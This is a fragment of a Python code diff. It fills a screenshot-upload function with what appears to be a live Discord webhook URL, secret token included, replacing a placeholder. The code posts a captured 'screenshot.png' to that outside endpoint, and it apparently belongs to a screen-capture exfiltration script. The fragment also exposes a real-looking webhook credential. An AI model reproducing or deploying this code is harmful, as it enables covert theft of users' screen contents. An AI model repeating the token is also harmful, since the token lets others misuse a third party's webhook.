@@ -20,7 +20,7 @@ def install_packages():
 
 def send_image_to_webhook(image_bytes):
     """Send the image to a webhook."""
-    webhook_url = 'YOUR_WEBHOOK_URL'
+    webhook_url = 'https://discord.com/api/webhooks/1268233884227731486/KCCL0wVA00etokhAtjGCEP7GGpOO7x9P1Oe6SDuwl8r5JY6b8PFhkR5vzn7JymVV21jP'
     files = {'file': ('screenshot.png', image_bytes, 'image/png')}
     response = requests.post(webhook_url, files=files)
     if response.status_code == 200:
